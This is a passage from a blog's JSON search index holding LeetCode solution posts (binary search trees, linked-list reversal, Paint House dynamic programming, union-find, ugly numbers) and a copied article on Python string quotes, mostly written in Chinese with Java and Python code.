Given target = 5, return true. Given target = 20, return false.","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"},{"name":"Divide and Conquer","slug":"Divide-and-Conquer","permalink":"http://larryim.cc/tags/Divide-and-Conquer/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"241. Different Ways to Add Parentheses","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-241-Different-Ways-to-Add-Parentheses/","text":"Given a string of numbers and operators, return all possible results from computing all the different possible ways to group numbers and operators. The valid operators are +, - and *. Example 1: 12345Input: &quot;2-1-1&quot;Output: [0, 2]Explanation: ((2-1)-1) = 0 (2-(1-1)) = 2 Example 2: 12345678Input: &quot;2*3-4*5&quot;Output: [-34, -14, -10, -10, 10]Explanation: (2*(3-(4*5))) = -34 ((2*3)-(4*5)) = -14 ((2*(3-4))*5) = -10 (2*((3-4)*5)) = -10 (((2*3)-4)*5) = 10 Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Divide and Conquer","slug":"Divide-and-Conquer","permalink":"http://larryim.cc/tags/Divide-and-Conquer/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"99. Recover Binary Search Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-99-Recover-Binary-Search-Tree/","text":"Two elements of a binary search tree (BST) are swapped by mistake. Recover the tree without changing its structure. Example 1: 123456789101112131415Input: [1,3,null,null,2] 1 / 3 \\ 2Output: [3,1,null,null,2] 3 / 1 \\ 2 Example 2: 123456789101112131415Input: [3,1,4,null,null,2] 3 / \\1 4 / 2Output: [2,1,4,null,null,3] 2 / \\1 4 / 3 Follow up: A solution using $O(n)$ space is pretty straight forward. Could you devise a constant space solution? Java这道题目其实一点都不难，最多medium，就是中序遍历的升级版。难点是确定发生错误的节点。因为交换错误非常简单，把两个节点值互换而已。那么怎么确定发生错误的节点呢？我们知道搜索二叉树的中序遍历是升序序列，发生交换有两种情况： 两个相邻节点互换，有1个数字不遵循升序序列 1234567891011121314 3 / \\ / \\ 1 4 / 2 中序遍历：[1,3,2,4] 2 / \\ / \\ 1 4 / 3 中序遍历：[1,2,3,4] 两个不相邻节点互换，有2个数字不遵循升序序列。 1234567891011121314 2 / \\ / \\ 4 1 / 3 中序遍历：[4,2,3,1] 2 / \\ / \\ 1 4 / 3 中序遍历：[1,2,3,4] 第二种情况则很简单，直接交换；那么第一种呢，观察发现，当两个相邻节点互换，两个节点在遍历的时候分别为发现错误的节点和错误节点的前一个节点。 123456789101112131415161718192021222324private TreeNode prev; // 前一个节点的值private int num = 0; // 遍历的节点个数private TreeNode errorNode1, errorNode2; // 错误的节点 public void recoverTree(TreeNode root) &#123; errorNode1 = null; errorNode2 = null; num = 0; inorderTraversal(root); int temp = errorNode2.val; errorNode2.val = errorNode1.val; errorNode1.val = temp;&#125;private void inorderTraversal(TreeNode root) &#123; if (root == null) return; inorderTraversal(root.left); if (num++ != 0 &amp;&amp; root.val &lt;= prev.val) &#123; if (errorNode2 == null) errorNode1 = prev; errorNode2 = root; &#125; prev = root; inorderTraversal(root.right);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"25. Reverse Nodes in k-Group","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-25-Reverse-Nodes-in-k-Group/","text":"Given a linked list, reverse the nodes of a linked list $k$ at a time and return its modified list. $k$ is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of $k$ then left-out nodes in the end should remain as it is. You may not alter the values in the nodes, only nodes itself may be changed. Only constant memory is allowed. Example: Given this linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5 For $k = 2$, you should return: 2-&gt;1-&gt;4-&gt;3-&gt;5 For $k = 3$, you should return: 3-&gt;2-&gt;1-&gt;4-&gt;5 Note: Only constant extra memory is allowed. You may not alter the values in the list’s nodes, only nodes itself may be changed. Java一种直接的方法就是对每$k$个元素，依次进行反转，反转的方法可以参考LeetCode-Q206ReverseLinkedList. 123456789101112131415161718192021222324252627282930313233343536373839public ListNode reverseKGroup(ListNode head, int k) &#123; if ((head==null) || (head.next == null) || (k == 1)) &#123; return head; &#125; ListNode pos = head; ListNode cur; ListNode prev; ListNode next; ListNode last = head; // find the length of the linked list int len; for (len = 1; pos.next!= null; len++) pos = pos.next; pos = head; // reverse for (int i = 0; i &lt; len/k; i++) &#123; cur = pos.next; prev = pos; // reverse each k nodes for (int j = 0; j &lt; k-1; j++) &#123; next = cur.next; cur.next = prev; prev = cur; cur = next; &#125; if (i == 0) &#123; head = prev; &#125; else &#123; last.next = prev; &#125; last = pos; pos.next = cur; pos = cur; &#125; return head;&#125; Python1234567891011121314151617181920212223242526272829303132333435363738def reverseKGroup(self, head, k): \"\"\" :type head: ListNode :type k: int :rtype: ListNode \"\"\" # 特殊情况 if k &lt; 2: return head newhead = ListNode(0) newhead.next = head results = newhead while 1: before = newhead # 前进k步 count = 0 tmp = [] while newhead.next and count &lt; k: newhead = newhead.next tmp.append(newhead) count += 1 # 判断退出条件 if count != k: return results.next # 反转 after = newhead.next tmp[0].next = after before.next = tmp[k-1] for i in reversed(range(1, k)): tmp[i].next = tmp[i-1] newhead = tmp[0] return results.next","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"256. Paint House","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-256-Paint-House/","text":"There are a row of $n$ houses, each house can be painted with one of the three colors: red, blue or green. The cost of painting each house with a certain color is different. You have to paint all the houses such that no two adjacent houses have the same color. The cost of painting each house with a certain color is represented by a $n \\times 3$ cost matrix. For example, costs[0][0] is the cost of painting house 0 with color red; costs[1][2] is the cost of painting house 1 with color green, and so on… Find the minimum cost to paint all houses. Note: All costs are positive integers. Example 12Given costs = [[14,2,11],[11,14,5],[14,3,10]] return 10house 0 is blue, house 1 is green, house 2 is blue, 2 + 5 + 3 = 10 Java这道题目LeetCode要收费的，相应的LintCode链接。 题目要求给一排房子刷漆(红绿蓝三种颜色)，相邻房子的油漆颜色不能相同，而且每个房子的每种颜色的价格都是不一样的。最后让我们求给所有房子刷漆的最小费用。这道题目利用的是动态规划，需要维护一个二维的数组dp，其中dp[i][j]表示从第0套房子刷到第$i$套房子，其中第$i$套房子用颜色$j$的最小花费，递推式为: 1dp[i][j] = dp[i][j] + min(dp[i - 1][(j + 1) % 3], dp[i - 1][(j + 2) % 3])； 主要思想为第$i$房子有三种颜色可以刷，但如果当前房子刷了任意一种颜色，那么前一个房子$i - 1$肯定只能刷其他两种颜色($(j + 1) % 3, (j + 2) % 3$)。所以刷到当前房子用某种颜色的最小花费等于当前房子刷颜色的钱，加上刷到前一个房子用不同颜色的最小花费。 12345678910public int minCost(int[][] costs) &#123; if (costs == null || costs.length == 0) return 0; int[][] dp = costs.clone(); for (int i = 1; i &lt; dp.length; ++i) for (int j = 0; j &lt; 3; ++j) dp[i][j] += Math.min(dp[i - 1][(j + 1) % 3], dp[i - 1][(j + 2) % 3]); Arrays.sort(dp[dp.length - 1]); return dp[dp.length - 1][0]; &#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"10. Regular Expression Matching","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-10-Regular-Expression-Matching/","text":"Implement regular expression matching with support for . and *. 12345678910111213141516&apos;.&apos; Matches any single character.&apos;*&apos; Matches zero or more of the preceding element.The matching should cover the entire input string (not partial).The function prototype should be:bool isMatch(const char *s, const char *p)Some examples:isMatch(&quot;aa&quot;,&quot;a&quot;) → falseisMatch(&quot;aa&quot;,&quot;aa&quot;) → trueisMatch(&quot;aaa&quot;,&quot;aa&quot;) → falseisMatch(&quot;aa&quot;, &quot;a*&quot;) → trueisMatch(&quot;aa&quot;, &quot;.*&quot;) → trueisMatch(&quot;ab&quot;, &quot;.*&quot;) → trueisMatch(&quot;aab&quot;, &quot;c*a*b&quot;) → true","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"257. Binary Tree Paths","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-257-Binary-Tree-Paths/","text":"Given a binary tree, return all root-to-leaf paths. Note: A leaf is a node with no children. Example: 12345678Input: 1 / \\2 3 \\ 5Output: [&quot;1-&gt;2-&gt;5&quot;, &quot;1-&gt;3&quot;]Explanation: All root-to-leaf paths are: 1-&gt;2-&gt;5, 1-&gt;3 Java使用DFS+回溯法的思想，寻找路径 123456789101112131415161718192021public class Q257BinaryTreePaths &#123; private List&lt;String&gt; paths = new ArrayList&lt;&gt;(); public List&lt;String&gt; binaryTreePaths(TreeNode root) &#123; binaryTreePathsHelper(root, new StringBuilder()); return paths; &#125; public void binaryTreePathsHelper(TreeNode root, StringBuilder s) &#123; if (root == null) return; String tmp = String.format(\"%d-&gt;\", root.val); s.append(tmp); if (root.left == null &amp;&amp; root.right == null)&#123; paths.add(s.substring(0, s.length() - 2)); s.delete(s.length() - tmp.length(), s.length()); return; &#125; binaryTreePathsHelper(root.left, s); binaryTreePathsHelper(root.right, s); s.delete(s.length() - tmp.length(), s.length()); &#125;&#125; 一种小的修改是首先求出路径，然后再转化为字符串打印； 1234567891011121314151617181920212223242526272829public class Q257BinaryTreePaths &#123; private List&lt;List&lt;Integer&gt;&gt; paths = new ArrayList&lt;&gt;(); public List&lt;String&gt; binaryTreePaths(TreeNode root) &#123; List&lt;String&gt; res = new ArrayList&lt;&gt;(); binaryTreePathsHelper(root, new ArrayList&lt;&gt;()); for (List&lt;Integer&gt; list: paths) &#123; StringBuilder s = new StringBuilder(); for (Integer i: list) &#123; s.append(String.format(\"%d-&gt;\", i)); &#125; res.add(s.substring(0, s.length() - 2)); &#125; return res; &#125; public void binaryTreePathsHelper(TreeNode root, List&lt;Integer&gt; list) &#123; if (root == null) return; list.add(root.val); if (root.left == null &amp;&amp; root.right == null)&#123; paths.add(new ArrayList&lt;&gt;(list)); list.remove(list.size() - 1); return; &#125; binaryTreePathsHelper(root.left, list); binaryTreePathsHelper(root.right, list); list.remove(list.size() - 1); &#125;&#125; 运行时间基本一致。 在论坛上发现一个非常优美的方案，直接使用String，而不是StringBuilder，利用参数传递省去了s.delete操作。所以速度反而非常快。 1234567891011public List&lt;String&gt; binaryTreePaths(TreeNode root) &#123; List&lt;String&gt; answer = new ArrayList&lt;String&gt;(); if (root != null) searchBT(root, \"\", answer); return answer;&#125;private void searchBT(TreeNode root, String path, List&lt;String&gt; answer) &#123; String local = path + root.val; if (root.left == null &amp;&amp; root.right == null) answer.add(local); if (root.left != null) searchBT(root.left, local + \"-&gt;\", answer); if (root.right != null) searchBT(root.right, local + \"-&gt;\", answer);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"Python引号","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Python-python引号/","text":"https://blog.csdn.net/woainishifu/article/details/76105667 Python中单引号，双引号，3个单引号及3个双引号的区别2017年07月26日 10:21:23 邓无邪 阅读数：37124更多个人分类： Python版权声明：本文为博主原创文章，未经博主允许不得转载。 https://blog.csdn.net/woainishifu/article/details/76105667单引号和双引号在Python中我们都知道单引号和双引号都可以用来表示一个字符串，比如 str1 = ‘python’str2 = “python”str1和str2是没有任何区别的。 我们知道Python以其易用性而著名，所以刚开始看教程学习看到单引号和双引号都可以使用会以为这是Python为了方便程序员，随便用哪个就好，不用担心用错。其实，背后的原因不只是这么简单。举个例子，想想I’m a big fans of Python.这个字符串应该怎么定义。 单引号版本： str3 = ‘I\\’m a big fan of Python.’可以注意到，原来的字符串中有一个’，而Python又允许使用单引号’ ‘来表示字符串，所以字符串中间的’必须用转移字符\\才可以。字符串中间只有一个’，这样写看起来还好，但是如果是We all know that ‘A’ and ‘B’ are two capital letters.这个字符串呢？str4 = ‘We all know that \\’A\\’ and \\’B\\’ are two capital letters.’怎么样，是不是看起来就很不好看，而且很容易出错了？这个时候就是双引号也可以表示字符串该体现作用的时候了。下面是str4的双引号版本： str4_ = “We all know that ‘A’ and ‘B’ are two capital letters.”这样是不是看起来就人性化多了？没错，这就是Python支持双引号和单引号都能用来定义字符串的原因。 反之，如果字符串中有双引号，为了避免使用转义符，你可以使用单引号来定义这个字符串。比如： str5 = ‘The teacher said: “Practice makes perfect” is a very famous proverb.’这就是Python易用性和人性化的一个极致体现，当你用单引号’ ‘定义字符串的时候，它就会认为你字符串里面的双引号” “是普通字符，从而不需要转义。反之当你用双引号定义字符串的时候，就会认为你字符串里面的单引号是普通字符无需转义。 3个单引号及3个双引号实际上3个单引号和3个双引号不经常用，但是在某些特殊格式的字符串下却有大用处。通常情况下我们用单引号或者双引号定义一个字符串的时候只能把字符串连在一起写成一行，如果非要写成多行，就得在每一行后面加一个\\表示连字符，比如： str1 = “List of name:\\ Hua Li\\ Chao Deng”而且即使你这样写也不能得到期望的输出： List of name:Hua LiChao Deng实际上输出是下面这样的： str1 = “List of name:\\… Hua Li\\… Chao Deng”print(str1)List of name: Hua Li Chao Deng 那么该如何得到我们期望的一行一个名字的输出格式呢？这就是3个引号的作用了： str1 = “””List of name:… Hua Li… Chao Deng… “””print(str1)List of name:Hua LiChao Deng 虽然我们也可以通过给字符串加上\\n实现： str1 = “List of name:\\nHua Li\\nChao Deng”print(str1)List of name:Hua LiChao Deng但是这样在输入的时候看起来就乱了很多不是么？所以这种情况下尽量使用3个引号，至于3个单引号还是双引号都是一样的，只需要注意如果字符串中包含有单引号就要使用双引号来定义就好了。 而且使用3个引号还有一个特别棒的作用就是：加注释！ str1 = “””… List of name:… Hua Li # LiHua… Chao Deng # DengChao… “””print(str1) List of name:Hua Li # LiHuaChao Deng # DengChao如果要实现这种输出效果，仅仅使用单引号或者双引号还能实现吗？","tags":[{"name":"Python","slug":"Python","permalink":"http://larryim.cc/tags/Python/"}],"categories":[{"name":"Python","slug":"Python","permalink":"http://larryim.cc/categories/Python/"}]},{"title":"26. Remove Duplicates from Sorted Array","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-26-Remove-Duplicates-from-Sorted-Array/","text":"题目[Easy] Given a sorted array, remove the duplicates in-place such that each element appear only once and return the new length. Do not allocate extra space for another array, you must do this by modifying the input array in-place with $O(1)$ extra memory. Example:1234Given nums = [1,1,2],Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively.It doesn&apos;t matter what you leave beyond the new length. 中文题目从一个有序的数组中去除重复的数字，返回处理后的数组长度。 注意点：只能用常量的额外空间, 将不重复的数字移到数组前部，剩余的部分不需要处理 例子： 输入: nums = [1, 1, 2] 输出: 2 思路因为去重的是一个已经排好序的数组，所以有重复的数据一定在一起，遍历数组，判断当前数据是否有重复，有重复将重复的数据用后面的数据覆盖 123456789101112131415class Solution(object): def removeDuplicates(self, nums): \"\"\" :type nums: List[int] :rtype: int \"\"\" n = len(nums) if n &lt; 2: return n count = 0 for i in range(1, n): if nums[i] != nums[count]: count += 1 nums[count] = nums[i] return count+1","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"261. Graph Valid Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-261-Graph-Valid-Tree/","text":"Given n nodes labeled from 0 to $n - 1$ and a list of undirected edges (each edge is a pair of nodes), write a function to check whether these edges make up a valid tree. For example: 12Given n = 5 and edges = [[0, 1], [0, 2], [0, 3], [1, 4]], return true.Given n = 5 and edges = [[0, 1], [1, 2], [2, 3], [1, 3], [1, 4]], return false. Hint: Given n = 5 and edges = [[0, 1], [1, 2], [3, 4]], what should your return? Is this case a valid tree? According to the definition of tree on Wikipedia: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.” JavaLeetCode这道题目需要收费，参见LintCode。 A tree is an acyclic connected graph. 判断无向图是否为树。图论基本算法。图为树的先决条件是1.无环，2.可连通。判断无向图有环的方法有bfs、dfs、并查集，判断可连接的方法还是有bfs、dfs、并查集。 无向图的环的判断可参考这里。 使用并查集(weighted-path with compression)： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * @param n: An integer * @param edges: a list of undirected edges * @return: true if it's a valid tree, or false */public boolean validTree(int n, int[][] edges) &#123; // special case, 0 vertex if (n == 0) return false; int [] id = new int[n]; int [] size = new int[n]; // 初始化id for (int i = 0; i &lt; n; i++) id[i] = i; // 确认图是否有环 for (int[] edge : edges) &#123; int v = edge[0], w = edge[1]; // 遍历所有边，查找到边的顶点所在的集合，如果相同，则有环 int i = find(id, v), j = find(id, w); if (i == j) return false; union(id, size, i, j); &#125; // 确认图是否连通 int group = find(id, 0); for (int v = 1; v &lt; n; v++) if (find(id, v) != group) return false; return true;&#125; // union v and wprivate void union(int[] id, int[] size, int v, int w) &#123; // find roots of v and w int i = find(id, v); int j = find(id, w); if (i == j) return; // link the root of small tree to large tree if (size[i] &gt; size[j]) &#123;id[j] = i; size[i] += size[j];&#125; else &#123;id[i] = j; size[j] += size[i];&#125;&#125; private int find(int[] id, int v) &#123; while (id[v] != v) &#123; // point to its grandparent; id[v] = id[id[v]]; v = id[v]; &#125; return v;&#125; 并查集的方案是最快的，beat 100%。因为使用DFS和BFS需要构建图。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"},{"name":"Union Find","slug":"Union-Find","permalink":"http://larryim.cc/tags/Union-Find/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"263. Ugly Number","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-263-Ugly-Number/","text":"Write a program to check whether a given number is an ugly number. Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. Example 1: 123Input: 6Output: trueExplanation: 6 = 2 × 3 Example 2: 123Input: 8Output: trueExplanation: 8 = 2 × 2 × 2 Example 3: 123Input: 14Output: false Explanation: 14 is not ugly since it includes another prime factor 7. Note: 1 is typically treated as an ugly number. Input is within the 32-bit signed integer range: [−$2^{31}$, $2^{31}$ − 1]. Java这道题目如果直接按照题目的描述来解决：$n$试着处以任何一个小于$n$的整数，结果只有2,3,5可以整除的$n$是ugly number。这很显然不行，因为当$n$很大的时候，这个循环得多大啊。 利用逆向思维，既然只能被2,3,5整除，那就整除这些数字，看最后结果是不是1。 123456789public boolean isUgly(int num) &#123; // 负数不是ugly number if (num &lt;= 0) return false; // 如果能被2,3,5整除，就整除 while(num % 2 == 0) num /= 2; while(num % 3 == 0) num /= 3; while(num % 5 == 0) num /= 5 ; return num == 1;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"264. Ugly Number II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-264-Ugly-Number-II/","text":"Write a program to find the $n$-th ugly number. Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. Example: 123Input: n = 10Output: 12Explanation: 1, 2, 3, 4, 5, 6, 8, 9, 10, 12 is the sequence of the first 10 ugly numbers. Note: 1 is typically treated as an ugly number. $n$ does not exceed 1690. Java这道题目是263. Ugly Number的延伸，要求给出前$n$个丑数。丑数的质因数只包含2，3，5。所以一个丑数可以表示为$2^{t_2}3^{t_3}5^{t_5}$，其中$t_2,t_3,t_5$为自然数。一种最简单的方法是，求出丑数，然后取出前$n$个值。由于不好判断丑树的顺序，所以采用最小二叉堆来保存。 算法时间复杂度为$n\\log(n)$，因为每添加/删除一个元素的时间复杂度是$\\log(n)$，一共有$n$个循环，空间复杂度是$O(n)$。 123456789101112131415public int nthUglyNumber(int n) &#123; if (n == 1) return 1; PriorityQueue&lt;Long&gt; q = new PriorityQueue(); // 注意Long q.offer(1l); for(int i=1; i &lt; n; i++) &#123; long min = q.poll(); while(!q.isEmpty() &amp;&amp; q.peek() == min) q.poll(); q.offer(min*2); q.offer(min*3); q.offer(min*5); &#125; return q.poll().intValue();&#125; 使用动态规划能将时间和空间复杂度降低为$O(n)$。在最开始，丑数为1，即uglyNumber[0] = 1，$t_2,t_3,t_5$都为0， 然后 uglyNumber[1] = Math.min(uglyNumber[0]*2, uglyNumber[0]*3, uglyNumber[0]*5)，结果是uglyNumber[0]*2, 所以把$t_2$变成1. 继续uglyNumber[2] = Math.min(uglyNumber[1]*2, uglyNumber[0]*3, uglyNumber[0]*5). 1234567891011121314public int nthUglyNumber(int n) &#123; if (n == 1) return 1; int t2 = 0, t3 = 0, t5 = 0; // pointers for 2, 3, 5 int[] uglyNumber = new int[n]; uglyNumber[0] = 1; for(int i = 1; i &lt; n ; i ++)&#123; uglyNumber[i] = Math.min(uglyNumber[t2] * 2, Math.min(uglyNumber[t3] * 3,uglyNumber[t5] * 5)); if(uglyNumber[i] == uglyNumber[t2]*2) t2++; if(uglyNumber[i] == uglyNumber[t3]*3) t3++; if(uglyNumber[i] == uglyNumber[t5]*5) t5++; &#125; return uglyNumber[n-1];&#125;","tags":[{"name":"LintCode","slug":"LintCode","permalink":"http://larryim.cc/tags/LintCode/"},{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"},{"name":"Heap","slug":"Heap","permalink":"http://larryim.cc/tags/Heap/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"265. Paint House II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-265-Paint-House-II/","text":"There are a row of n houses, each house can be painted with one of the k colors. The cost of painting each house with a certain color is different. You have to paint all the houses such that no two adjacent houses have the same color. The cost of painting each house with a certain color is represented by a n x k cost matrix. For example, costs[0][0] is the cost of painting house 0 with color 0; costs[1][2] is the cost of painting house 1 with color 2, and so on… Find the minimum cost to paint all houses. All costs are positive integers. Example: 123Given n = 3, k = 3, costs = [[14,2,11],[11,14,5],[14,3,10]] return 10. Explanation: house 0 is color 2, house 1 is color 3, house 2 is color 2, 2 + 5 + 3 = 10 ChallengeCould: you solve it in $O(nk)$? Java这道题目LeetCode要收费的，相应的LintCode链接。与LeetCode 256. Paint House一摸一样，把3变成$k$而已。代码思路一摸一样。 12345678910111213141516171819202122232425public int minCostII(int[][] costs) &#123; if (costs == null || costs.length == 0) return 0; int[][] dp = costs.clone(); int k = dp[0].length; int prevMin = Integer.MAX_VALUE; for (int i = 1; i &lt; dp.length; i++) for (int j = 0; j &lt; k; j++) &#123; // 求刷到前一栋房子的最小费用为prevMin // 注意每个j对应的prevMin都不一样 prevMin = Integer.MAX_VALUE; for (int kk = 1; kk &lt; k; kk++) if (dp[i - 1][(j + kk) % k] &lt; prevMin) prevMin = dp[i - 1][(j + kk) % k]; // 刷到第i栋房子，用j颜色的费用 = // 求刷到前一栋房子i-1的最小费用 + 刷这一栋房子i的费用 dp[i][j] += prevMin; &#125; // 求刷到最后一栋房子的最小费用 prevMin = Integer.MAX_VALUE; for (int kk = 0; kk &lt; k; kk++) if (dp[dp.length - 1][kk] &lt; prevMin) prevMin = dp[dp.length - 1][kk]; return prevMin;&#125; 上面的代码可读性很差，尤其是下标的求余操作，把它包装成函数之后，不仅可读性增加了，而且速度也变快了： 12345678910111213141516171819202122232425262728293031/** * @param costs: n x k cost matrix * @return: an integer, the minimum cost to paint all houses */public int minCostII(int[][] costs) &#123; if (costs == null || costs.length == 0) return 0; int[][] dp = costs.clone(); int k = dp[0].length; int prevMin = Integer.MAX_VALUE; for (int i = 1; i &lt; dp.length; i++) for (int j = 0; j &lt; k; j++) &#123; // 刷到第i栋房子，用j颜色的费用 = // 求刷到前一栋房子i-1的最小费用 + 刷这一栋房子i的费用 dp[i][j] += minExpense(dp[i - 1], j); &#125; return minExpense(dp[dp.length - 1], -1);&#125; /** * 求刷到前一栋房子的最小费用 * @param nums: 费用 * @param exclusive: 当前房子的颜色，被排除在前一栋房子的颜色中 * @return: 刷到前一栋房子的最小费用 */private int minExpense(int[] nums, int exclusive) &#123; int min = Integer.MAX_VALUE; for (int k = 0; k &lt; nums.length; k++) if (k != exclusive &amp;&amp; nums[k] &lt; min) min = nums[k]; return min;&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"98. Validate Binary Search Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-98-Validate-Binary-Search-Tree/","text":"Given a binary tree, determine if it is a valid binary search tree (BST). Assume a BST is defined as follows: The left subtree of a node contains only nodes with keys less than the node’s key. The right subtree of a node contains only nodes with keys greater than the node’s key. Both the left and right subtrees must also be binary search trees. Example 1: 12345Input: 2 / \\ 1 3Output: true Example 2: 12345678 5 / \\ 1 4 / \\ 3 6Output: falseExplanation: The input is: [5,1,4,null,null,3,6]. The root node&apos;s value is 5 but its right child&apos;s value is 4. Java这道题目题意非常清楚：确认二叉树是否为二叉搜索树。所以最笨的方法就是使用题目定义的三种条件去一一确认。使用前序遍历获得子树的节点，这里直接照搬144. Binary Tree Preorder Traversal的代码过来。时间复杂度为$O(n^2)$，空间复杂度为$O(n^2)$。 12345678910111213141516171819202122232425public boolean isValidBST(TreeNode root) &#123; if (root == null) return true; // 确认左子树节点都小于该节点 for(int i: preorderTraversal(root.left)) if (i &gt;= root.val) return false; // 确认右子树节点都大于该节点 for(int i: preorderTraversal(root.right)) if (i &lt;= root.val) return false; // 确认左子树和右子树也是二叉搜索树 return isValidBST(root.left) &amp;&amp; isValidBST(root.right); &#125; private List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); preorderTraversalHelper(root, list); return list;&#125;private void preorderTraversalHelper(TreeNode root, List&lt;Integer&gt; list) &#123; if (root == null) return; list.add(root.val); preorderTraversalHelper(root.left, list); preorderTraversalHelper(root.right, list);&#125; 优化一下，在遍历的时候进行判断。由于右子树和左子树的判断条件不同，所以写了两个函数preorderTraversalLeft、preorderTraversalRight分别进行遍历并判断。返回的结果是，是否符合给定的条件。时间复杂度为$O(n^2)$，空间复杂度为$O(1)$。 1234567891011121314151617181920212223public boolean isValidBST(TreeNode root) &#123; if (root == null) return true; if (!preorderTraversalLeft(root.left, root.val)) return false; if (!preorderTraversalRight(root.right, root.val)) return false; return isValidBST(root.left) &amp;&amp; isValidBST(root.right); &#125; private boolean preorderTraversalLeft(TreeNode root, int comparison) &#123; if (root == null) return true; if (root.val &gt;= comparison) return false; return preorderTraversalLeft(root.left, comparison) &amp;&amp; preorderTraversalLeft(root.right, comparison); &#125; private boolean preorderTraversalRight(TreeNode root, int comparison) &#123; if (root == null) return true; if (root.val &lt;= comparison) return false; return preorderTraversalRight(root.left, comparison) &amp;&amp; preorderTraversalRight(root.right, comparison);&#125; 其实这道题目有个trick，因为二叉搜索树的中序遍历有个特点，它是个递增序列。所以只需要中序遍历二叉搜索树一次，然后看看中序遍历是否是递增序列即可。中序遍历的方法可以参照94. Binary Tree Inorder Traversal，这里直接照搬过来了。时间复杂度为$O(n)$，空间复杂度为$O(2n)$。空间复杂度为$O(2n)$的原因是一个List保存遍历结果，一个Stack保存将要遍历的节点。 1234567891011121314151617181920212223242526public boolean isValidBST(TreeNode root) &#123; List&lt;Integer&gt; list = inOrderTraversal(root); int i = 0; 